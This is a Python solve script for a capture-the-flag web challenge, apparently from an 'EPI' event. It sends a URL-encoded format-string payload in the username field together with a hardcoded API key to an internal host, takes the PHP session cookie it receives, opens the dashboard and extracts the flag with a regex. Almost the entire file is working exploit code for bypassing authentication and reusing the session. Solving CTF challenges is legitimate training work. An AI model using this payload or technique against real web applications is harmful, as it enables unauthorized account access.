#!/usr/bin/env python3

import requests
import re

TARGET = "http://internal.ecorp.epi"
API_KEY = "EPI{W3lC0m3_70_0v3RFL0wZ}"

def extract_flag(dashboard_response: str) -> str:
    flag = re.findall(r"EPI\{[^}]+\}", dashboard_response)
    if flag:
            print(flag[0])
    else:
        print("Could not find any flag")


def exploit_overformat():
    print("[*] Step 1 : Format string overflow to obtain session...")
    resp = requests.post(
        TARGET,
        data=f"username=%2532cintrauser&api_key={API_KEY}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False
    )

    session_cookie = resp.cookies.get("PHPSESSID")
    if not session_cookie:
        print("[-] Failure : No PHPSESSID in response")
        return

    print(f"[+] Obtained session : PHPSESSID={session_cookie}")
    assert resp.status_code == 302, f"Did not receive 302"
    assert resp.headers.get("Location") == "/dashboard.php", "Wrong redirection"
    print(f"[+] Redirection to /dashboard.php confirmed")

    print("\n[*] Step 2 : Accessing dashboard...")

    dash = requests.get(
        f"{TARGET}/dashboard.php",
        cookies={"PHPSESSID": session_cookie},
        allow_redirects=False
    )

    if dash.status_code != 200:
        print(f"[-] Dashboard unavailable (status {dash.status_code})")
        return

    print(f"[+] Dashboard available (status {dash.status_code})")
    extract_flag(dash.text)

if __name__ == "__main__":
    exploit_overformat()
